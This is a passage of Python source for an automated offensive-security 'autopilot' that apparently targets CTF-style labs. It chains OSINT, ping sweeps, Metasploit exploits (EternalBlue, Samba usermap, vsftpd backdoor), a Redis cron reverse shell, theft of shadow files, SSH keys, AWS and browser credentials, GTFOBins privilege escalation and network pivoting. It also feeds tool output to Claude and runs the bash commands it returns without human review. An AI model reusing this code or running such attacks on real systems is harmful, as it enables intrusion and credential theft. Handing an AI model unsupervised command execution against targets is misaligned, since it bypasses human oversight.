            "Responde SOLO con este JSON:\n"
            '{"next_commands": ["cmd1", "cmd2"], "reasoning": "breve explicación", "priority": "high/medium/low"}\n'
            "Los comandos deben ser ejecutables directamente en bash contra el target. "
            f"Usa la IP {target} directamente. Máximo 3 comandos."
        )
        try:
            body = json.dumps({
                "model": "claude-haiku-4-5-20251001",
                "max_tokens": 400,
                "system": system_prompt,
                "messages": [{"role": "user", "content": user_prompt}]
            }).encode()
            req = _req.Request(
                "https://api.anthropic.com/v1/messages",
                data=body,
                headers={
                    "Content-Type": "application/json",
                    "x-api-key": api_key,
                    "anthropic-version": "2023-06-01",
                },
                method="POST"
            )
            with _req.urlopen(req, timeout=30) as resp:
                data = json.loads(resp.read())
                text = data.get("content", [{}])[0].get("text", "").strip()
            if not text:
                return
            # Strip potential markdown code fences
            text = re.sub(r'^```(?:json)?\s*|\s*```$', '', text.strip())
            result = json.loads(text)
            cmds = result.get("next_commands", [])
            priority_map = {"high": 15, "medium": 25, "low": 35}
            pri = priority_map.get(result.get("priority", "medium"), 25)
            reasoning = result.get("reasoning", "")
            if reasoning:
                self._log(f"CLAUDE [{target}] {reasoning[:100]}")
            for cmd in cmds[:3]:
                cmd = cmd.strip()
                if cmd and len(cmd) > 5 and not cmd.startswith("#"):
                    self._enqueue(pri, f"Claude:{cmd[:40]}", cmd, target)
                    self._log(f"CLAUDE [{target}] Enqueued: {cmd[:60]}")
        except Exception as _e:
            self._log(f"CLAUDE [{target}] Error: {_e}")

    def _ping_sweep(self, cidr):
        self._log(f"SWEEP Ping sweep {cidr}...")
        cmd = f"nmap -sn {cidr} -oG - 2>/dev/null | awk '/Up$/ {{print $2}}'"
        output, _ = self._run_sync(f"PingSweep:{cidr}", cmd, cidr)
        live = [l.strip() for l in output.split("\n") if re.match(r'^\d+\.\d+\.\d+\.\d+$', l.strip())]
        self._log(f"SWEEP {len(live)} hosts vivos en {cidr}")
        return live or [cidr.split("/")[0]]

    def _living_report(self):
        project = read_project(self.project_id)
        if not project:
            return
        try:
            html = _generate_html_report(project)
            (PROJECTS_DIR / f"{self.project_id}_living.html").write_text(html, encoding="utf-8")
            self._log(f"REPORT Actualizado ({len(project.get('loot',[]))} loot, {len(project.get('findings',[]))} findings)")
        except Exception as e:
            self._log(f"REPORT Error: {e}")

    # ── Feature 6: OSINT pre-scan ────────────────────────────────────────────
    def _osint_phase(self, target):
        is_domain = bool(re.match(
            r'^(?!\d+\.\d+\.\d+\.\d+$)[a-zA-Z0-9][a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}$', target))
        prev = MEMORY.recall_host(target)
        if prev:
            self._log(f"OSINT [{target}] Memoria: {len(prev)} puertos conocidos de sesiones anteriores")

        self._log(f"OSINT [{target}] Fase OSINT {'(dominio)' if is_domain else '(IP)'}")
        if is_domain:
            harvester_bin = (shutil.which("theHarvester") or shutil.which("theharvester")
                             or shutil.which("theHarvester.py"))
            if not harvester_bin:
                self._log(f"WARN [{target}] theHarvester no encontrado — saltando OSINT harvest")
                out = ""
            else:
                out, _ = self._run_sync(f"OSINT-Harvest:{target}",
                    f"{harvester_bin} -d {target} -l 100 -b bing,certspotter,hackertarget 2>/dev/null",
                    target)
            found_ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', out)
            new_ips = set(found_ips) - self._all_scanned - {target}
            for ip in list(new_ips)[:5]:
                if ip and not re.match(r'^(127\.|0\.|255\.)', ip):
                    self._log(f"OSINT [{target}] Nuevo IP descubierto: {ip}")
                    self._pivot_targets.add(ip)

            out2, _ = self._run_sync(f"OSINT-DNS:{target}",
                f"dnsrecon -d {target} -t std 2>/dev/null"
                f" || dig +short {target} ANY 2>/dev/null || echo 'dnsrecon not available'", target)
            sub_count = len(re.findall(r'\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b', out2))
            if sub_count:
                self._log(f"OSINT [{target}] DNS: {sub_count} registros encontrados")
        else:
            out, _ = self._run_sync(f"OSINT-rDNS:{target}",
                f"host {target} 2>/dev/null; whois {target} 2>/dev/null | head -25", target)
            rdns = re.search(r'domain name pointer (.+)', out, re.I)
            if rdns:
                self._log(f"OSINT [{target}] rDNS: {rdns.group(1).rstrip('.')}")

    # ── Feature 1: Auto-exploit via searchsploit/metasploit ──────────────────
    def _auto_exploit(self, target, port, service, version):
        if self.mode == "stealth" or not version:
            return
        ver = version.lower()
        svc = service.lower()

        # ── Direct no-MSF exploits for well-known vulns ──────────────────────
        # vsftpd 2.3.4 backdoor
        if "vsftpd 2.3.4" in ver or "vsftpd_234" in ver:
            self._log(f"EXPLOIT [{target}:{port}] vsftpd 2.3.4 backdoor — probando directamente")
            self._enqueue(2, f"vsftpd-Direct:{target}",
                f"(echo -e 'USER user:)\\nPASS pass\\n' | nc -w3 {target} 21 2>/dev/null; "
                f"sleep 1; echo 'id; whoami; hostname' | nc -w5 {target} 6200 2>/dev/null)", target)

        # UnrealIRCd backdoor
        if "unrealircd 3.2.8" in ver:
            self._log(f"EXPLOIT [{target}:{port}] UnrealIRCd backdoor — probando directamente")
            self._enqueue(2, f"UnrealIRCd-Backdoor:{target}",
                f"echo 'AB; id; whoami' | nc -w5 {target} {port} 2>/dev/null | head -5", target)

        # Samba username map script (CVE-2007-2447)
        if re.match(r'samba 3\.[0-2]\.', ver):
            self._log(f"EXPLOIT [{target}:{port}] Samba 3.x usermap_script — probando")
            self._enqueue(2, f"Samba-UserMap:{target}",
                f"msfconsole -q -x 'use exploit/multi/samba/usermap_script; "
                f"set RHOSTS {target}; set LHOST {self.lhost}; set PAYLOAD cmd/unix/reverse;"
                f" run; sleep 10; exit' 2>/dev/null", target)

        # Redis no-auth RCE
        if "redis" in svc and port == 6379:
            self._log(f"EXPLOIT [{target}:{port}] Redis — verificando acceso no-auth")
            self._enqueue(2, f"Redis-NoAuth:{target}",
                f"if redis-cli -h {target} ping 2>/dev/null | grep -q PONG; then "
                f"echo 'REDIS_NO_AUTH_CONFIRMED'; "
                f"redis-cli -h {target} config get dir; "
                f"redis-cli -h {target} config get dbfilename; fi 2>/dev/null", target)

        # distccd RCE
        if "distccd" in svc or "distcc" in svc:
            self._log(f"EXPLOIT [{target}:{port}] distccd RCE — probando")
            self._enqueue(2, f"distccd-RCE:{target}",
                f"nmap -p 3632 --script distcc-cve2004-2687 --script-args 'distcc-cve2004-2687.cmd=id' {target} 2>/dev/null", target)

        # Searchsploit lookup for other services
        query = f"{service} {version}".strip()
        if len(query) < 5:
            return
        self._log(f"EXPLOIT [{target}:{port}] Searchsploit: {query}")
        out, _ = self._run_sync(f"Searchsploit:{target}:{port}",
            f"searchsploit --json '{query}' 2>/dev/null || searchsploit '{query}' 2>/dev/null", target)
        if not out or len(out) < 20:
            return

        msf_modules = []
        edb_titles = []
        try:
            data = json.loads(out)
            for e in (data.get("RESULTS_EXPLOIT") or [])[:5]:
                path = e.get("Path", "")
                m = re.search(r'modules/(.+?)\.rb', path)
                if m:
                    msf_modules.append(m.group(1))
                edb_titles.append(f"EDB-{e.get('EDB-ID','?')}: {e.get('Title','')[:60]}")
        except (json.JSONDecodeError, Exception):
            for line in out.split("\n"):
                m = re.search(r'exploit/\S+', line)
                if m:
                    msf_modules.append(m.group(0))

        if edb_titles:
            self._log(f"EXPLOIT [{target}:{port}] {len(edb_titles)} exploit(s): {edb_titles[0]}")

        if msf_modules:
            self._log(f"EXPLOIT [{target}:{port}] MSF módulo disponible: {msf_modules[0]}")
            # Run MSF exploit in normal AND aggressive mode
            if self.mode in ("normal", "aggressive"):
                self._enqueue(8, f"MSF-Exploit:{target}:{port}",
                    f"msfconsole -q -x \"use {msf_modules[0]};"
                    f" set RHOSTS {target}; set RPORT {port};"
                    f" set LHOST {self.lhost}; set LPORT {self.lport}; set ExitOnSession false; run -j; sleep 20; sessions -l; exit\""
                    f" 2>/dev/null", target)
        else:
            exploits = len([l for l in out.split("\n") if "|" in l])
            if exploits:
                self._log(f"EXPLOIT [{target}:{port}] {exploits} exploits en searchsploit (revisar manualmente)")

    # ── Feature 2: Post-exploitation chain ───────────────────────────────────
    def _post_exploit(self, target, user, pwd, ssh_output=""):
        if "uid=" not in ssh_output:
            return
        self._log(f"EXEC [{target}] Shell SSH como '{user}' — iniciando post-explotación")
        self.stats["creds_found"] = self.stats.get("creds_found", 0) + 1
        MEMORY.remember_cred(target, "ssh", user, pwd, verified=True)

        ssh_prefix = (f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no"
                      f" -o ConnectTimeout=10 {user}@{target}")
        # Comprehensive Linux post-exploit enum
        self._enqueue(1, f"PostExploit-Enum:{target}:{user}",
            f"{ssh_prefix} "
            f"'echo ==ID== && id && whoami"
            f" && echo ==UNAME== && uname -a"
            f" && echo ==HOSTNAME== && hostname && ip a 2>/dev/null | grep inet"
            f" && echo ==SUDO== && sudo -l 2>&1 | head -20"
            f" && echo ==PASSWD== && cat /etc/passwd | grep -v nologin | grep -v false"
            f" && echo ==SHADOW_CHECK== && ls -la /etc/shadow 2>&1"
            f" && echo ==SUID== && find / -perm -4000 -type f 2>/dev/null | head -25"
            f" && echo ==SGID== && find / -perm -2000 -type f 2>/dev/null | head -10"
            f" && echo ==CAPABILITIES== && getcap -r / 2>/dev/null | head -15"
            f" && echo ==CRON== && cat /etc/crontab 2>/dev/null; ls /etc/cron.* 2>/dev/null | head -10"
            f" && echo ==WRITABLE_CRON== && find /etc/cron* -writable 2>/dev/null"
            f" && echo ==SERVICES== && ps aux --no-headers 2>/dev/null | grep -v \\\"\\[\\\" | head -20"
            f" && echo ==ENV_SECRETS== && env 2>/dev/null | grep -iE password\\|pass\\|secret\\|key\\|token\\|api | head -10"
            f" && echo ==HISTORY== && cat ~/.bash_history 2>/dev/null | head -30"
            f" && echo ==SSH_KEYS== && ls -la ~/.ssh/ 2>/dev/null; cat ~/.ssh/authorized_keys 2>/dev/null | head -5"
            f" && echo ==FLAGS== && find / -name user.txt -o -name root.txt -o -name flag.txt 2>/dev/null | head -5"
            f"' 2>/dev/null",
            target)

        self._enqueue(2, f"PivotCheck:{target}:{user}",
            f"{ssh_prefix} 'ip route 2>/dev/null; arp -a 2>/dev/null; ip a 2>/dev/null"
            f" && cat /etc/hosts 2>/dev/null | grep -v localhost | grep -v ^# | head -20' 2>/dev/null",
            target)
        self._cred_map[f"PIVOT:{target}"] = (user, pwd)

        # Try privilege escalation via sudo nopasswd
        self._enqueue(1, f"PrivEsc-Sudo:{target}:{user}",
            f"{ssh_prefix} "
            f"'SUDO_NOPASS=$(sudo -l 2>&1 | grep NOPASSWD); "
            f"echo \"$SUDO_NOPASS\"; "
            f"if echo \"$SUDO_NOPASS\" | grep -qiE \"bash|sh|python|perl|ruby|vim|nano|less|more|find|awk|nmap|nc|curl|wget\"; then "
            f"echo PRIVESC_POSSIBLE_SUDO; fi' 2>/dev/null",
            target)

        # Try reading flag files directly
        self._enqueue(1, f"ReadFlags:{target}:{user}",
            f"{ssh_prefix} "
            f"'cat /root/root.txt 2>/dev/null; cat /home/*/user.txt 2>/dev/null; "
            f"find / -maxdepth 5 -name root.txt -o -name user.txt 2>/dev/null | xargs cat 2>/dev/null | head -5' 2>/dev/null",
            target)

        # ── Post-root sensitive data collection ──────────────────────────────
        # Collects high-value files as structured loot for the report
        self._enqueue(1, f"SensitiveDataCollect:{target}:{user}",
            f"{ssh_prefix} "
            f"'echo ==SHADOW==; cat /etc/shadow 2>/dev/null | head -20"
            f"; echo ==SSH_KEYS==; cat ~/.ssh/id_rsa 2>/dev/null | head -30"
            f"; cat /root/.ssh/id_rsa 2>/dev/null | head -30"
            f"; echo ==ENV_FILES==; find / -maxdepth 6 -name \".env\" -readable 2>/dev/null | head -5 | xargs cat 2>/dev/null | head -40"
            f"; echo ==DB_CONFIGS==; find / -maxdepth 8 \\( -name wp-config.php -o -name database.yml -o -name settings.py -o -name config.php -o -name .htpasswd \\) -readable 2>/dev/null | head -5 | xargs cat 2>/dev/null | grep -iE \"pass|secret|key|user|db_\" | head -20"
            f"; echo ==NETWORK_MAP==; cat /etc/hosts 2>/dev/null; ip route 2>/dev/null; arp -a 2>/dev/null | head -20"
            f"; echo ==AWS_CREDS==; cat ~/.aws/credentials 2>/dev/null; cat /root/.aws/credentials 2>/dev/null"
            f"; echo ==BROWSER_LOGINS==; find / -maxdepth 8 -name \"Login Data\" -path \"*/Chrome/*\" 2>/dev/null | head -3 | xargs -I@ sh -c 'echo DB: @ ; sqlite3 \"@\" \"SELECT origin_url,username_value FROM logins\" 2>/dev/null | head -20'"
            f"' 2>/dev/null", target)

        if self.mode in ("normal", "aggressive"):
            # LinPEAS for full privesc check
            self._enqueue(3, f"LinPEAS:{target}",
                f"{ssh_prefix} "
                f"'curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
                f" | bash 2>/dev/null | grep -E \"\\033\\[0;31m|SUID|SGID|sudo|NOPASSWD|cap_setuid|writable\" | head -60"
                f" || wget -qO- https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
                f" | bash 2>/dev/null | head -200' 2>/dev/null", target)

    # ── Feature 10: Pivot output processor ───────────────────────────────────
    def _process_pivot_output(self, output, source_target):
        found_networks = set()
        source_prefix = '.'.join(source_target.split('.')[:3])

        for m in re.finditer(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/(\d{1,2})', output):
            ip, prefix = m.group(1), int(m.group(2))
            pfx3 = '.'.join(ip.split('.')[:3])
            if 8 <= prefix <= 30 and pfx3 != source_prefix and not ip.startswith(('127.', '0.', '255.')):
                found_networks.add(m.group(0))

        for m in re.finditer(r'\((\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\)', output):
            ip = m.group(1)
            pfx3 = '.'.join(ip.split('.')[:3])
            if pfx3 != source_prefix and not ip.startswith(('127.', '0.', '255.')):
                found_networks.add(f"{pfx3}.0/24")

        for net in found_networks:
            MEMORY.remember_pivot(source_target, net)
            self._log(f"PIVOT [{source_target}] Nueva red: {net} — iniciando sweep")
            live = self._ping_sweep(net)
            for ip in live[:8]:
                if ip not in self._all_scanned:
                    self._log(f"PIVOT [{source_target}] Host vivo en red pivot: {ip}")
                    self._pivot_targets.add(ip)

    def start(self):
        self._running = True
        self._started_at = datetime.now().isoformat()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        self._log(f"ENGINE Autopiloto iniciado — modo:{self.mode}, targets:{self.targets}")

    def stop(self):
        self._running = False
        self._log("ENGINE Deteniendo autopiloto...")

    def get_status(self):
        elapsed = 0
        if self._started_at:
            elapsed = int((datetime.now() - datetime.fromisoformat(self._started_at)).total_seconds())
        return {
            "running": self._running,
            "mode": self.mode,
            "targets": self.targets,
            "stats": self.stats,
            "queue_size": self._job_queue.qsize(),
            "completed_jobs": len(self._completed_jobs),
            "timeline": self.timeline[-100:],
            "heatmap": self.heatmap,
            "elapsed_seconds": elapsed,
            "started_at": self._started_at,
            "memory": MEMORY.get_stats(),
            "pivot_networks": len(self._pivot_targets),
        }

    def get_log_since(self, offset):
        with self._brain_log_lock:
            return self._brain_log[offset:]

    # ── Evidence capture helper ───────────────────────────────────────────────
    def _capture_exploit_evidence(self, output, target, job_name, command):
        """Detect exploitation success in job output and save finding with full evidence."""
        if not output or len(output) < 10:
            return

        # Detection patterns: (regex, title, severity, cve, cvss)
        EXPLOIT_MARKERS = [
            (r'uid=0\(root\)', "RCE Confirmado — Shell como root", "critical", "", 10.0),
            (r'uid=\d+\(\w+\).*gid=\d+', "RCE Confirmado — Ejecución de Comandos", "critical", "", 9.8),
            (r'Pwn3d!', "Acceso Admin Confirmado (Pwn3d!)", "critical", "", 9.8),
            (r'Administrator:500:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}', "Hashes NTLM Volcados (secretsdump)", "critical", "", 9.0),
            (r'REDIS_NO_AUTH_CONFIRMED|Redis RCE cron written', "Redis Sin Auth — RCE Confirmado", "critical", "", 9.8),
            (r'VSFTPD_BACKDOOR_CONFIRMED|vsftpd.*backdoor.*root', "vsftpd 2.3.4 Backdoor RCE Confirmado", "critical", "", 10.0),
            (r'TOMCAT_CREDS_VALID:', "Tomcat Manager — Credenciales Válidas", "high", "", 8.8),
            (r'PHPMYADMIN_CREDS:', "phpMyAdmin — Acceso Confirmado", "high", "", 8.0),
            (r'SHELLSHOCK_RCE', "Shellshock RCE Confirmado", "critical", "CVE-2014-6271", 10.0),
            (r'LFI FOUND|root:x:0:0.*bash', "LFI — /etc/passwd Leído", "high", "", 7.5),
            (r'Jenkins.*println.*uid=|groovy.*exec.*uid=', "Jenkins RCE via Groovy Script Confirmado", "critical", "CVE-2019-1003000", 9.8),
            (r'PRIVESC_POSSIBLE_SUDO.*ESCALATED|uid=0.*sudo', "PrivEsc via sudo NOPASSWD — Root Obtenido", "critical", "", 9.8),
            (r'root\.txt[:\s]+[a-fA-F0-9]{32}', "Flag Root Capturada", "critical", "", 10.0),
            # ADCS
            (r'[Gg]ot [Hh]ash.*[a-fA-F0-9]{32}|NT [Hh]ash[:\s]+[a-fA-F0-9]{32}|PKINIT.*[Ss]uccess', "ADCS PWNED — NT Hash via Certipy PKINIT", "critical", "", 9.8),
            (r'[Cc]ertificate.*saved|[Ss]aved.*\.pfx|certipy.*[Ss]uccess', "ADCS — Certificado de Impersonación Obtenido (Certipy ESC1)", "critical", "", 9.8),
            # NTLM Relay
            (r'[Aa]dding.*[Cc]omputer.*[Aa]ccount|[Cc]reated.*machine.*account|ntlmrelayx.*\[\+\].*[Ss]uccess', "NTLM Relay Exitoso — Cuenta Máquina Creada", "critical", "", 9.8),
            (r'[Rr]elayed.*[Aa]dministrator|[Rr]elay.*[Pp]wn3d|[Aa]uthenticated.*[Aa]s.*ADMIN', "NTLM Relay → Acceso Admin Obtenido", "critical", "", 10.0),
            # Delegation / RBCD
            (r'[Ss]ervice [Tt]icket.*[Aa]dministrator|[Ii]mpersonating.*[Aa]dministrator|KRB_AS_REP.*[Aa]dministrator', "Kerberos Delegation — Ticket Admin Obtenido (S4U)", "critical", "", 9.8),
            # GraphQL / JWT
            (r'GRAPHQL_INTROSPECTION_ENABLED', "GraphQL — Introspección Habilitada en Producción", "medium", "", 5.3),
            (r'JWT.*cracked|jwt.*secret.*found|NONE_ALG_VULN|Algorithm.*none.*accepted', "JWT Vulnerable — Secreto Crackeado o alg:none Aceptado", "critical", "", 9.1),
            # ACL abuse
            (r'[Ss]et.*[Pp]assword.*[Ss]uccess|[Pp]assword.*[Cc]hanged.*successfully', "ACL Abuse — Contraseña Reseteada via GenericAll/ForceChangePassword", "critical", "", 9.0),
            # Shadow Credentials
            (r'[Ss]hadow [Cc]redentials.*[Aa]dded|KeyCredential.*added|pywhisker.*[Ss]uccess', "Shadow Credentials — KeyCredential Añadido (msDS-KeyCredentialLink)", "high", "", 8.8),
            # SSRF / Cloud
            (r'SSRF_CLOUD_METADATA_CONFIRMED|security-credentials.*AccessKeyId|"AccessKeyId"\s*:|iam.*security-credentials.*\w{16}', "SSRF → AWS Metadata Expuesto (Credenciales IAM)", "critical", "", 9.1),
        ]

        for pattern, title, severity, cve, cvss in EXPLOIT_MARKERS:
            if not re.search(pattern, output, re.IGNORECASE | re.DOTALL):
                continue

            ev_lines = [
                f"Tool: {job_name}",
                f"Target: {target}",
                f"Command:\n{command}",
                "",
                f"Output:\n{output[:3000]}",
            ]
            if len(output) > 3000:
                ev_lines.append(f"\n[... {len(output)-3000} chars truncated ...]")

            finding = {
                "id": str(uuid.uuid4()),
                "title": f"[Exploit Confirmado] {title} @ {target}",
                "severity": severity, "status": "open",
                "cve": cve, "cvss": cvss,
                "description": (
                    f"Explotación confirmada por el Autopilot durante '{job_name}'.\n"
                    f"Patrón detectado: {pattern}\n"
                    f"El output completo del comando está en la evidencia."
                ),
                "evidence": "\n".join(ev_lines),
                "hosts": [target],
                "source": "autopilot-exploit",
                "created_at": datetime.now().isoformat(),
            }
            _auto_mitre_tag(finding)

            with self._project_lock:
                project = read_project(self.project_id)
                if not project:
                    return
                existing_titles = {f.get("title", "") for f in project.get("findings", [])}
                base_title = f"[Exploit Confirmado] {title} @ {target}"
                if base_title not in existing_titles:
                    project.setdefault("findings", []).append(finding)
                    write_project(project)
                    self.stats["findings_count"] += 1
                    self._log(f"EVIDENCE [{target}] Explotación guardada: {title}")
            break  # one finding per output (most specific match wins)

    # ── BLOCK 1: Worker thread (parallel job consumer) ───────────────────────
    def _worker_thread(self, delay, job_timeout):
        while self._running:
            try:
                _, _, task = self._job_queue.get(timeout=3)
            except queue.Empty:
                continue
            if not self._running:
                break
            name, command, target = task["name"], task["command"], task["target"]
            self._log(f"EXEC [{target}] {name}")
            try:
                output, job_id = self._run_sync(name, command, target, timeout=job_timeout)
                _, new_creds = self._save_parsed(output, target, name.split(":")[0])
                self._capture_exploit_evidence(output, target, name, command)

                self._react_to_findings(output, target, name)

                if "CredReuse-SSH:" in name and "uid=" in output:
                    parts = name.split(":")
                    user = parts[2] if len(parts) > 2 else ""
                    pwd = self._cred_map.get(f"{target}:{user}", "")
                    if user and pwd:
                        self._post_exploit(target, user, pwd, output)

                if "PivotCheck:" in name:
                    self._process_pivot_output(output, target)

                if new_creds and self.mode != "stealth":
                    project_snap = read_project(self.project_id)
                    _ntlm_from_loot = [
                        l["value"].split(":")[1] if ":" in l["value"] else l["value"]
                        for l in (project_snap or {}).get("loot", [])
                        if l.get("type") == "hash" and re.match(r'[a-fA-F0-9]{32}', l.get("value",""))
                    ][:10]
                    self._credential_reuse(new_creds, target, ntlm_hashes=_ntlm_from_loot or None)

                if any(x in name for x in ["Kerberoast-Crack", "ASREPRoast-Crack"]):
                    _kracked = re.findall(r'\$krb5(?:tgs|asrep)\$[^\s:]{10,}:(\S{3,})', output)
                    _kracked += re.findall(r'^(\w[\w.@\-]+):(\S{3,}):.*\$krb5', output, re.MULTILINE)
                    for _item in _kracked:
                        _pw = _item if isinstance(_item, str) else f"{_item[0]}:{_item[1]}"
                        if _pw and self.mode != "stealth":
                            self._log(f"KERBEROAST [{target}] Contraseña crackeada → credential reuse: {_pw[:20]}")
                            self._credential_reuse([_pw], target)

                if self.mode == "aggressive" and len(output) > 150:
                    self._ask_ollama(output, target)
                # Claude AI decision making (normal + aggressive, only for significant output)
                if self.mode in ("normal", "aggressive") and len(output) > 200 and \
                        not name.startswith("Claude:") and not name.startswith("AI:"):
                    import os as _os
                    if _os.environ.get("ANTHROPIC_API_KEY"):
                        self._ask_claude(output, target)
                self._completed_jobs.append({"job_id": job_id, "name": name, "target": target})
            except Exception as _worker_exc:
                self._log(f"ERROR [{target}] Worker error en '{name}': {_worker_exc}")
            if delay:
                time.sleep(delay)

    # ── BLOCK 2: Reactive exploitation — triggered immediately on critical finds
    def _react_to_findings(self, output, target, tool_name):
        ol = output.lower()

        # ms17-010 VULNERABLE → EternalBlue MSF priority 0
        # Requires both the script name AND VULNERABLE to appear anywhere in output (multiline-safe)
        if re.search(r'smb-vuln-ms17-010|ms17-010', output, re.I) and re.search(r'VULNERABLE', output, re.I):
            self._log(f"REACT [{target}] MS17-010 CONFIRMADO → EternalBlue AHORA")
            self._enqueue(0, f"EternalBlue:{target}",
                f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; "
                f"set RHOSTS {target}; set LHOST {self.lhost}; "
                f"set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LPORT {self.lport}; "
                f"set ExitOnSession false; run -j; sleep 30; sessions -l; exit' 2>/dev/null", target)

        # MS08-067 VULNERABLE
        if re.search(r'ms08-067|smb-vuln-ms08-067', output, re.I) and re.search(r'VULNERABLE', output, re.I):
            self._log(f"REACT [{target}] MS08-067 → MSF netapi")
            self._enqueue(0, f"MS08067:{target}",
                f"msfconsole -q -x 'use exploit/windows/smb/ms08_067_netapi; "
                f"set RHOSTS {target}; set LHOST {self.lhost}; set LPORT {self.lport}; "
                f"run; sleep 20; sessions -l; exit' 2>/dev/null", target)

        # SMB Pwn3d! → Impacket chain (extract user:pass from crackmapexec output)
        if re.search(r'Pwn3d!|\(Pwn3d!\)', output, re.I):
            m = re.search(r'SMB\s+\S+\s+\d+\s+\S+\s+\[\+\]\s+(\S+)\\(\S+):(\S+)', output)
            if m:
                domain_part, user, pwd = m.group(1), m.group(2), m.group(3)
                self._admin_creds[target] = {"user": user, "pwd": pwd, "domain": domain_part, "ntlm": ""}
                self._cred_map[f"{target}:{user}"] = pwd
                if domain_part and domain_part not in (".", "WORKGROUP"):
                    self._domain = domain_part
                self._log(f"REACT [{target}] Pwn3d! como {user} → Impacket chain")
                self._impacket_chain(target, user, pwd, domain_part)

        # Redis no-auth → RCE via cron
        if "REDIS_NO_AUTH_CONFIRMED" in output or (
                re.search(r'^\+PONG', output, re.M) and "redis" in tool_name.lower()):
            self._log(f"REACT [{target}] Redis no-auth → RCE cron write")
            self._enqueue(0, f"Redis-RCE:{target}",
                f"redis-cli -h {target} config set dir /var/spool/cron/crontabs 2>/dev/null && "
                f"redis-cli -h {target} config set dbfilename root 2>/dev/null && "
                f"redis-cli -h {target} set job '\\n\\n* * * * * bash -i >& /dev/tcp/127.0.0.1/9001 0>&1\\n\\n' 2>/dev/null && "
                f"redis-cli -h {target} bgsave 2>/dev/null && "
                f"echo 'Redis RCE cron written'", target)

        # vsftpd backdoor confirmed → grab shell (nmap outputs ftp-vsftpd-backdoor + VULNERABLE)
        if ("VSFTPD_BACKDOOR_CONFIRMED" in output or
                re.search(r'ftp-vsftpd-backdoor', output, re.I) and re.search(r'VULNERABLE', output, re.I) or
                re.search(r'vsftpd.*backdoor.*root|uid=0.*vsftpd', output, re.I)):
            self._log(f"REACT [{target}] vsftpd backdoor → grabbing shell")
            self._enqueue(0, f"vsftpd-Shell-Grab:{target}",
                f"echo 'id; whoami; hostname; cat /root/root.txt 2>/dev/null; "
                f"cat /home/*/user.txt 2>/dev/null' | nc -w 10 {target} 6200 2>/dev/null", target)

        # sudo NOPASSWD → GTFOBins escalation
        if "PRIVESC_POSSIBLE_SUDO" in output:
            sudo_bin = ""
            m = re.search(r'NOPASSWD.*?/(bash|sh|python3?|perl|ruby|vim|find|nmap|awk|less|more|nc|curl|wget)', output, re.I)
            if m:
                sudo_bin = m.group(1)
            self._log(f"REACT [{target}] sudo NOPASSWD ({sudo_bin or 'bin'}) → escalada GTFOBins")
            gtfo_cmds = {
                "bash": "sudo bash -p -c 'id; cat /root/root.txt 2>/dev/null'",
                "python": "sudo python -c \"import pty; pty.spawn('/bin/bash')\" 2>/dev/null || sudo python -c 'import os; os.system(\\\"id; cat /root/root.txt 2>/dev/null\\\")'",
                "python3": "sudo python3 -c 'import os; os.system(\"id; cat /root/root.txt 2>/dev/null\")'",
                "perl": "sudo perl -e 'system(\"id; cat /root/root.txt 2>/dev/null\")'",
                "find": "sudo find / -name root.txt -exec cat {} \\; 2>/dev/null; sudo find /bin/bash -exec bash -p \\; 2>/dev/null",
                "nmap": "echo 'os.execute(\"/bin/bash\")' > /tmp/nmap.script; sudo nmap --script /tmp/nmap.script 2>/dev/null",
                "vim": "sudo vim -c ':!id' -c ':!cat /root/root.txt' -c ':q!' 2>/dev/null",
            }
            cmd = gtfo_cmds.get(sudo_bin.lower(), f"sudo {sudo_bin} -c 'id; whoami' 2>/dev/null")
            self._enqueue(0, f"GTFOBins-Sudo:{target}:{sudo_bin}", cmd, target)

        # NFS no_root_squash → mount
        if "no_root_squash" in ol:
            safe_t = target.replace(".", "_")
            self._log(f"REACT [{target}] NFS no_root_squash → mount attempt")
            self._enqueue(1, f"NFS-Mount:{target}",
                f"showmount -e {target} 2>/dev/null; "
                f"mkdir -p /tmp/nfs_{safe_t} 2>/dev/null; "
                f"mount -t nfs -o nolock {target}:/ /tmp/nfs_{safe_t} 2>/dev/null && "
                f"ls -la /tmp/nfs_{safe_t}/ 2>/dev/null; "
                f"cat /tmp/nfs_{safe_t}/root/.ssh/id_rsa 2>/dev/null; "
                f"cat /tmp/nfs_{safe_t}/root/root.txt 2>/dev/null", target)

        # Tomcat manager accessible
        if re.search(r'TOMCAT_CREDS_VALID:|tomcat.*manager.*200|/manager/html.*200', output, re.I):
            m = re.search(r'TOMCAT_CREDS_VALID:(\S+):(\S+)', output)
            u, p = (m.group(1), m.group(2)) if m else ("admin", "admin")
            self._log(f"REACT [{target}] Tomcat Manager credenciales válidas → WAR upload")
            self._web_exploit(target, 8080, f"http://{target}:8080", "tomcat", u, p)

        # Jenkins detected
        if re.search(r'Jenkins.*200|/jenkins.*200|X-Jenkins:', output, re.I):
            self._log(f"REACT [{target}] Jenkins detectado → Groovy RCE")
            self._web_exploit(target, 8080, f"http://{target}:8080", "jenkins")

        # phpMyAdmin accessible
        if re.search(r'PHPMYADMIN_CREDS:|phpMyAdmin.*200|/phpmyadmin.*200', output, re.I):
            m = re.search(r'PHPMYADMIN_CREDS:(\S+):(\S*)', output)
            u, p = (m.group(1), m.group(2)) if m else ("root", "")
            self._log(f"REACT [{target}] phpMyAdmin → webshell")
            self._web_exploit(target, 80, f"http://{target}", "phpmyadmin", u, p)

        # Secretsdump NTLM hashes → crack or PTH
        if re.search(r'Administrator:500:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}', output):
            m = re.search(r'Administrator:500:([a-fA-F0-9]{32}):([a-fA-F0-9]{32})', output)
            if m:
                ntlm = m.group(2)
                self._log(f"REACT [{target}] NTLM Administrator hash → PTH")
                cred = self._admin_creds.get(target, {})
                user = cred.get("user", "Administrator")
                domain = cred.get("domain", self._domain)
                self._admin_creds[target] = {**cred, "ntlm": ntlm, "user": "Administrator"}
                self._impacket_chain(target, "Administrator", "", domain, ntlm)
                # Also PTH on other known targets
